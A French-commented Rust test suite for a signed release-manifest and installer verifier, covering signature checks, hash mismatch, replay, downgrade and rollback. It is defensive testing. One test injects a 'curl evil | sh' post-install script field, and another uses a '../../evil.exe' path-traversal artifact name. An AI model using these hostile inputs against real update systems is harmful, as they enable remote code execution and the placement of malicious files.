//! Tests du spike S5 (porte G5) et des tests négatifs de sécurité applicables
//! (#32 : non autorisé / rejeu / mauvais hash).
use relay_release::*;
use std::path::{Path, PathBuf};
use tempfile::TempDir;

const NOW: u64 = 1_793_000_000;

fn target() -> Target {
    Target {
        product: "ainonymous-relay".into(),
        channel: "stable".into(),
        platform: "windows-x86_64".into(),
    }
}

fn write_artifact(dir: &Path, name: &str, content: &[u8]) -> PathBuf {
    let p = dir.join(name);
    std::fs::write(&p, content).unwrap();
    p
}

fn manifest_for(path: &Path, version: &str, sequence: u64) -> ReleaseManifest {
    let (sha256, size) = hash_file(path).unwrap();
    ReleaseManifest {
        schema: MANIFEST_SCHEMA,
        target: target(),
        version: version.into(),
        sequence,
        issued_at_unix: NOW - 60,
        expires_at_unix: NOW + 86_400,
        artifacts: vec![Artifact {
            name: path.file_name().unwrap().to_string_lossy().into(),
            kind: "nsis".into(),
            sha256,
            size,
            url: "https://example.invalid/relay.exe".into(),
        }],
    }
}

struct Fx {
    _dir: TempDir,
    dir: PathBuf,
    key: ed25519_dalek::SigningKey,
    trust: TrustStore,
}

fn fx() -> Fx {
    let d = TempDir::new().unwrap();
    let dir = d.path().to_path_buf();
    let key = generate_key();
    let mut trust = TrustStore::new();
    trust.add(key.verifying_key());
    Fx {
        _dir: d,
        dir,
        key,
        trust,
    }
}

// --- Signature / non autorisé -------------------------------------------

#[test]
fn manifeste_signe_valide_est_accepte() {
    let f = fx();
    let a = write_artifact(&f.dir, "relay-1.0.0.exe", b"installeur v1");
    let s = sign_manifest(manifest_for(&a, "1.0.0", 1), &f.key);
    verify_manifest(&s, &f.trust, &target(), &ClientState::default(), NOW).unwrap();
    verify_artifact(&a, &s.manifest.artifacts[0]).unwrap();
}

#[test]
fn cle_non_autorisee_refusee() {
    let f = fx();
    let a = write_artifact(&f.dir, "relay.exe", b"x");
    let intrus = generate_key();
    let s = sign_manifest(manifest_for(&a, "1.0.0", 1), &intrus);
    let e = verify_manifest(&s, &f.trust, &target(), &ClientState::default(), NOW).unwrap_err();
    assert!(matches!(e, ReleaseError::UnauthorizedKey(_)), "{e:?}");
}

#[test]
fn usurpation_de_key_id_refusee() {
    // Un attaquant signe avec sa clé mais annonce le key_id de l'éditeur.
    let f = fx();
    let a = write_artifact(&f.dir, "relay.exe", b"x");
    let mut s = sign_manifest(manifest_for(&a, "1.0.0", 1), &generate_key());
    s.key_id = hex::encode(f.key.verifying_key().to_bytes());
    assert_eq!(
        verify_manifest(&s, &f.trust, &target(), &ClientState::default(), NOW),
        Err(ReleaseError::BadSignature)
    );
}

#[test]
fn manifeste_altere_apres_signature_refuse() {
    let f = fx();
    let a = write_artifact(&f.dir, "relay.exe", b"x");
    let mut s = sign_manifest(manifest_for(&a, "1.0.0", 1), &f.key);
    s.manifest.artifacts[0].sha256 = "0".repeat(64);
    assert_eq!(
        verify_manifest(&s, &f.trust, &target(), &ClientState::default(), NOW),
        Err(ReleaseError::BadSignature)
    );
}

#[test]
fn signature_tronquee_refusee() {
    let f = fx();
    let a = write_artifact(&f.dir, "relay.exe", b"x");
    let mut s = sign_manifest(manifest_for(&a, "1.0.0", 1), &f.key);
    s.signature.truncate(10);
    assert_eq!(
        verify_manifest(&s, &f.trust, &target(), &ClientState::default(), NOW),
        Err(ReleaseError::BadSignature)
    );
}

#[test]
fn champ_inconnu_refuse_au_parsing() {
    let f = fx();
    let a = write_artifact(&f.dir, "relay.exe", b"x");
    let s = sign_manifest(manifest_for(&a, "1.0.0", 1), &f.key);
    let mut v = serde_json::to_value(&s).unwrap();
    v["manifest"]["post_install_script"] = "curl evil | sh".into();
    assert!(serde_json::from_value::<SignedManifest>(v).is_err());
}

#[test]
fn mauvaise_plateforme_refusee() {
    let f = fx();
    let a = write_artifact(&f.dir, "relay.apk", b"apk");
    let mut m = manifest_for(&a, "1.0.0", 1);
    m.target.platform = "android-arm64".into();
    let s = sign_manifest(m, &f.key);
    let e = verify_manifest(&s, &f.trust, &target(), &ClientState::default(), NOW).unwrap_err();
    assert!(matches!(e, ReleaseError::TargetMismatch(_)), "{e:?}");
}

#[test]
fn manifeste_expire_ou_futur_refuse() {
    let f = fx();
    let a = write_artifact(&f.dir, "relay.exe", b"x");
    let s = sign_manifest(manifest_for(&a, "1.0.0", 1), &f.key);
    assert_eq!(
        verify_manifest(
            &s,
            &f.trust,
            &target(),
            &ClientState::default(),
            NOW + 86_400
        ),
        Err(ReleaseError::Expired)
    );
    let mut m = manifest_for(&a, "1.0.0", 1);
    m.issued_at_unix = NOW + 3_600;
    let s = sign_manifest(m, &f.key);
    assert_eq!(
        verify_manifest(&s, &f.trust, &target(), &ClientState::default(), NOW),
        Err(ReleaseError::NotYetValid)
    );
}

#[test]
fn nom_artefact_avec_chemin_refuse() {
    let f = fx();
    let a = write_artifact(&f.dir, "relay.exe", b"x");
    let mut m = manifest_for(&a, "1.0.0", 1);
    m.artifacts[0].name = "../../evil.exe".into();
    let s = sign_manifest(m, &f.key);
    let e = verify_manifest(&s, &f.trust, &target(), &ClientState::default(), NOW).unwrap_err();
    assert!(matches!(e, ReleaseError::Malformed(_)), "{e:?}");
}

// --- Mauvais hash ---------------------------------------------------------

#[test]
fn artefact_avec_mauvais_hash_refuse() {
    let f = fx();
    let a = write_artifact(&f.dir, "relay.exe", b"installeur legiti");
    let s = sign_manifest(manifest_for(&a, "1.0.0", 1), &f.key);
    // même taille, contenu différent
    std::fs::write(&a, b"installeur piegee").unwrap();
    assert_eq!(
        std::fs::metadata(&a).unwrap().len(),
        s.manifest.artifacts[0].size
    );
    let e = verify_artifact(&a, &s.manifest.artifacts[0]).unwrap_err();
    assert!(matches!(e, ReleaseError::HashMismatch { .. }), "{e:?}");
}

#[test]
fn artefact_avec_mauvaise_taille_refuse() {
    let f = fx();
    let a = write_artifact(&f.dir, "relay.exe", b"v1");
    let s = sign_manifest(manifest_for(&a, "1.0.0", 1), &f.key);
    std::fs::write(&a, b"v1 + charge utile").unwrap();
    let e = verify_artifact(&a, &s.manifest.artifacts[0]).unwrap_err();
    assert!(matches!(e, ReleaseError::SizeMismatch { .. }), "{e:?}");
}

#[test]
fn install_refuse_mauvais_hash_sans_modifier_l_etat() {
    let f = fx();
    let root = f.dir.join("install");
    let inst = Installer::open(&root, target()).unwrap();
    let a = write_artifact(&f.dir, "relay.exe", b"bon contenu");
    let s = sign_manifest(manifest_for(&a, "1.0.0", 1), &f.key);
    std::fs::write(&a, b"mauvais con").unwrap();
    let e = inst
        .install(&s, "relay.exe", &a, &f.trust, NOW)
        .unwrap_err();
    assert!(matches!(e, ReleaseError::HashMismatch { .. }), "{e:?}");
    assert_eq!(inst.state().unwrap(), InstallerState::default());
    assert!(!root.join("versions/1.0.0").exists());
}

// --- Rejeu / rétrogradation ----------------------------------------------

#[test]
fn rejeu_du_meme_manifeste_refuse() {
    let f = fx();
    let inst = Installer::open(f.dir.join("i"), target()).unwrap();
    let a = write_artifact(&f.dir, "relay.exe", b"v1");
    let s = sign_manifest(manifest_for(&a, "1.0.0", 1), &f.key);
    inst.install(&s, "relay.exe", &a, &f.trust, NOW).unwrap();
    let e = inst
        .install(&s, "relay.exe", &a, &f.trust, NOW)
        .unwrap_err();
    assert_eq!(e, ReleaseError::Replay { got: 1, last: 1 });
}

#[test]
fn ancien_manifeste_valide_rejoue_refuse() {
    // Attaque « gel/rejeu » : l'attaquant ressert un manifeste v1 correctement
    // signé alors que v2 est installée.
    let f = fx();
    let inst = Installer::open(f.dir.join("i"), target()).unwrap();
    let a1 = write_artifact(&f.dir, "relay-1.exe", b"v1");
    let a2 = write_artifact(&f.dir, "relay-2.exe", b"v2");
    let s1 = sign_manifest(manifest_for(&a1, "1.0.0", 1), &f.key);
    let s2 = sign_manifest(manifest_for(&a2, "1.1.0", 2), &f.key);
    inst.install(&s1, "relay-1.exe", &a1, &f.trust, NOW)
        .unwrap();
    inst.install(&s2, "relay-2.exe", &a2, &f.trust, NOW)
        .unwrap();
    let e = inst
        .install(&s1, "relay-1.exe", &a1, &f.trust, NOW)
        .unwrap_err();
    assert_eq!(e, ReleaseError::Replay { got: 1, last: 2 });
}

#[test]
fn retrogradation_avec_nouvelle_sequence_refusee() {
    let f = fx();
    let inst = Installer::open(f.dir.join("i"), target()).unwrap();
    let a2 = write_artifact(&f.dir, "relay-2.exe", b"v2");
    let a1 = write_artifact(&f.dir, "relay-1.exe", b"v1");
    inst.install(
        &sign_manifest(manifest_for(&a2, "2.0.0", 5), &f.key),
        "relay-2.exe",
        &a2,
        &f.trust,
        NOW,
    )
    .unwrap();
    let e = inst
        .install(
            &sign_manifest(manifest_for(&a1, "1.9.9", 6), &f.key),
            "relay-1.exe",
            &a1,
            &f.trust,
            NOW,
        )
        .unwrap_err();
    assert!(matches!(e, ReleaseError::Downgrade { .. }), "{e:?}");
}

// --- Rollback ---------------------------------------------------------------

#[test]
fn rollback_explicite_restaure_la_version_precedente() {
    let f = fx();
    let inst = Installer::open(f.dir.join("i"), target()).unwrap();
    let a1 = write_artifact(&f.dir, "relay-1.exe", b"v1");
    let a2 = write_artifact(&f.dir, "relay-2.exe", b"v2");
    inst.install(
        &sign_manifest(manifest_for(&a1, "1.0.0", 1), &f.key),
        "relay-1.exe",
        &a1,
        &f.trust,
        NOW,
    )
    .unwrap();
    let s2 = sign_manifest(manifest_for(&a2, "1.1.0", 2), &f.key);
    inst.install(&s2, "relay-2.exe", &a2, &f.trust, NOW)
        .unwrap();
    let r = inst.rollback().unwrap();
    assert_eq!(r.version, "1.0.0");
    let st = inst.state().unwrap();
    assert_eq!(st.current.unwrap().version, "1.0.0");
    assert!(st.previous.is_none());
    // Le rollback ne réarme pas le manifeste v1.1.0 : séquence conservée.
    assert_eq!(st.client.last_sequence.values().copied().max(), Some(2));
    assert_eq!(
        inst.install(&s2, "relay-2.exe", &a2, &f.trust, NOW)
            .unwrap_err(),
        ReleaseError::Replay { got: 2, last: 2 }
    );
    // Une nouvelle release corrigée (séquence 3) reste installable.
    let a3 = write_artifact(&f.dir, "relay-3.exe", b"v1.1.1");
    inst.install(
        &sign_manifest(manifest_for(&a3, "1.1.1", 3), &f.key),
        "relay-3.exe",
        &a3,
        &f.trust,
        NOW,
    )
    .unwrap();
}

#[test]
fn rollback_sans_version_precedente_refuse() {
    let f = fx();
    let inst = Installer::open(f.dir.join("i"), target()).unwrap();
    assert_eq!(
        inst.rollback().unwrap_err(),
        ReleaseError::NoPreviousVersion
    );
    let a1 = write_artifact(&f.dir, "relay-1.exe", b"v1");
    inst.install(
        &sign_manifest(manifest_for(&a1, "1.0.0", 1), &f.key),
        "relay-1.exe",
        &a1,
        &f.trust,
        NOW,
    )
    .unwrap();
    assert_eq!(
        inst.rollback().unwrap_err(),
        ReleaseError::NoPreviousVersion
    );
}

#[test]
fn rollback_refuse_si_version_precedente_alteree_sur_disque() {
    let f = fx();
    let inst = Installer::open(f.dir.join("i"), target()).unwrap();
    let a1 = write_artifact(&f.dir, "relay-1.exe", b"v1");
    let a2 = write_artifact(&f.dir, "relay-2.exe", b"v2");
    inst.install(
        &sign_manifest(manifest_for(&a1, "1.0.0", 1), &f.key),
        "relay-1.exe",
        &a1,
        &f.trust,
        NOW,
    )
    .unwrap();
    inst.install(
        &sign_manifest(manifest_for(&a2, "1.1.0", 2), &f.key),
        "relay-2.exe",
        &a2,
        &f.trust,
        NOW,
    )
    .unwrap();
    let prev = inst.state().unwrap().previous.unwrap();
    std::fs::write(inst.artifact_path(&prev), b"vX").unwrap();
    let e = inst.rollback().unwrap_err();
    assert!(matches!(e, ReleaseError::HashMismatch { .. }), "{e:?}");
    assert_eq!(inst.state().unwrap().current.unwrap().version, "1.1.0");
}

#[test]
fn echec_du_controle_de_sante_declenche_le_rollback() {
    let f = fx();
    let inst = Installer::open(f.dir.join("i"), target()).unwrap();
    let a1 = write_artifact(&f.dir, "relay-1.exe", b"v1");
    let a2 = write_artifact(&f.dir, "relay-2.exe", b"v2 casse");
    inst.install(
        &sign_manifest(manifest_for(&a1, "1.0.0", 1), &f.key),
        "relay-1.exe",
        &a1,
        &f.trust,
        NOW,
    )
    .unwrap();
    let e = inst
        .install_with_health_check(
            &sign_manifest(manifest_for(&a2, "1.1.0", 2), &f.key),
            "relay-2.exe",
            &a2,
            &f.trust,
            NOW,
            |p| {
                std::fs::read(p)
                    .map(|b| !b.ends_with(b"casse"))
                    .unwrap_or(false)
            },
        )
        .unwrap_err();
    assert_eq!(e, ReleaseError::HealthCheckFailed("1.1.0".into()));
    let st = inst.state().unwrap();
    assert_eq!(st.current.unwrap().version, "1.0.0");
    assert_eq!(st.quarantined, vec!["1.1.0".to_string()]);
}

#[test]
fn etat_persiste_entre_redemarrages() {
    let f = fx();
    let root = f.dir.join("i");
    let a1 = write_artifact(&f.dir, "relay-1.exe", b"v1");
    let s1 = sign_manifest(manifest_for(&a1, "1.0.0", 1), &f.key);
    Installer::open(&root, target())
        .unwrap()
        .install(&s1, "relay-1.exe", &a1, &f.trust, NOW)
        .unwrap();
    // nouvelle instance = redémarrage du client
    let e = Installer::open(&root, target())
        .unwrap()
        .install(&s1, "relay-1.exe", &a1, &f.trust, NOW)
        .unwrap_err();
    assert!(matches!(e, ReleaseError::Replay { .. }));
}
